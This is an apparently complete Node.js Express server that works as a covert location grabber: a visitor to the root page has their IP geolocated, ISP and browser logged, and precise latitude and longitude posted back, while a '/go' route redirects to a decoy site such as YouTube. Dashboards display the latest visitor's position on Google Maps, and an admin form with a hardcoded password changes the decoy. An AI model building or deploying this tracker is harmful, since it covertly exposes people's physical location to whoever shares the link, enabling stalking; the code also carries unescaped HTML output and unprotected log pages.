const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const fs = require("fs");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// =========================
// SETTINGS
// =========================

const ADMIN_PASSWORD = "5811202126";
let redirectUrl = "https://www.youtube.com";

// =========================
// FUNCTIONS
// =========================

async function logVisitor(req) {

    let ip =
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket.remoteAddress;

    if (ip === "::1")
        ip = "127.0.0.1";

    let location = {};

    try {

        const response = await axios.get(
            `http://ip-api.com/json/${ip}`
        );

        location = response.data;

    } catch {

        location = {};
    }

    const log = {

        time: new Date().toLocaleString(),

        ip: ip,

        country: location.country || "Unknown",

        region: location.regionName || "Unknown",

        city: location.city || "Unknown",

        isp: location.isp || "Unknown",

        browser: req.headers["user-agent"]

    };

    let logs = [];

    if (fs.existsSync("logs.json")) {

        logs = JSON.parse(
            fs.readFileSync("logs.json")
        );

    }

    logs.unshift(log);

    fs.writeFileSync(
        "logs.json",
        JSON.stringify(logs, null, 2)
    );

}

// =========================
// VISITOR
// =========================

app.get("/", async (req, res) => {

    await logVisitor(req);

    res.sendFile(__dirname + "/pages/location.html");

});

// =========================
// ADMIN
// =========================

app.get("/admin", (req, res) => {

    res.send(`

<h2>Website Controller</h2>

<form method="POST" action="/update">

Password<br>
<input type="password" name="password">

<br><br>

Redirect URL<br>

<input
type="text"
name="url"
value="${redirectUrl}"
style="width:450px">

<br><br>

<button>

Update

</button>

</form>

`);

});

app.post("/update", (req, res) => {

    if (req.body.password !== ADMIN_PASSWORD)
        return res.send("Wrong password");

    redirectUrl = req.body.url;

    res.send("Updated successfully.<br><a href='/admin'>Back</a>");

});

// =========================
// LOGS
// =========================

app.get("/logs", (req, res) => {

    let logs = [];

    if (fs.existsSync("logs.json")) {

        logs = JSON.parse(
            fs.readFileSync("logs.json")
        );

    }

    res.send(`
        <pre style="font-size:16px">
${JSON.stringify(logs, null, 4)}
        </pre>
    `);

});
app.get("/location-dashboard", (req, res) => {

    let logs = [];

    if (fs.existsSync("logs.json")) {

        logs = JSON.parse(
            fs.readFileSync("logs.json", "utf8")
        );

    }

    if (logs.length === 0) {

        return res.send("No location data available.");

    }

    let latest = logs[0];

    res.send(`

    <html>
    <head>
        <title>Location Dashboard</title>
    </head>

    <body>

    <h1>Latest Visitor Location</h1>

    <p><b>Time:</b> ${latest.time}</p>

    <p><b>Latitude:</b> ${latest.latitude}</p>

    <p><b>Longitude:</b> ${latest.longitude}</p>

    <p><b>Accuracy:</b> ${latest.accuracy} meters</p>

    <p>
    <a target="_blank"
    href="https://www.google.com/maps?q=${latest.latitude},${latest.longitude}">
    Open Location on Google Maps
    </a>
    </p>

    <iframe
    width="600"
    height="450"
    frameborder="0"
    src="https://maps.google.com/maps?q=${latest.latitude},${latest.longitude}&z=15&output=embed">
    </iframe>


    </body>
    </html>

    `);

});

// =========================

app.post("/location", (req, res) => {

    let logs = [];

    if (fs.existsSync("logs.json")) {
        logs = JSON.parse(fs.readFileSync("logs.json", "utf8"));
    }

    if (logs.length > 0) {

        logs[0].latitude = req.body.latitude;
        logs[0].longitude = req.body.longitude;
        logs[0].accuracy = req.body.accuracy;

        fs.writeFileSync(
            "logs.json",
            JSON.stringify(logs, null, 2)
        );
    }

    res.sendStatus(200);

});

// ADD THIS
app.get("/go", (req, res) => {

    res.redirect(redirectUrl);

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

    console.log("Running on port " + PORT);

});